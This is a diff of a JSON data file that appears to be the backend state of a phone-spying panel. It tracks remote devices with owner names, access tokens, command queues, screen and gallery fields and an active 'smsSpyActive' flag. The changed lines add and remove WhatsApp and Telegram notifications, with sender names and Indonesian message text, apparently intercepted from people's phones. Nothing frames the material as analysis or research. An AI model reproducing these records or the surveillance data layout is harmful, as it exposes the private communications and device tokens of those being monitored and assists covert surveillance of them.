@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776781490352,
+    "lastSeen": 1776781493373,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10404,6 +10404,22 @@
     "smsSpyActive": true,
     "smsMessages": [
       {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "21/04 21:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781494515
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "21/04 21:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781494499
+      },
+      {
         "appName": "Telegram",
         "sender": "Telegram: Pengguna",
         "content": "Pesan baru",
@@ -14386,22 +14402,6 @@
         "time": "21/04 20:36",
         "pkg": "com.whatsapp",
         "receivedAt": 1776778601034
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 20:36",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776778599038
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram: Pengguna",
-        "content": "Pesan baru",
-        "time": "21/04 20:36",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776778597887
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776781489385,
+    "lastSeen": 1776781492434,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
@@ -16704,6 +16704,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "kimm ade' an",
+        "content": "wduh",
+        "time": "21/04 21:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776781493891
+      },
       {
         "appName": "WhatsApp",
         "sender": "kimm ade' an",
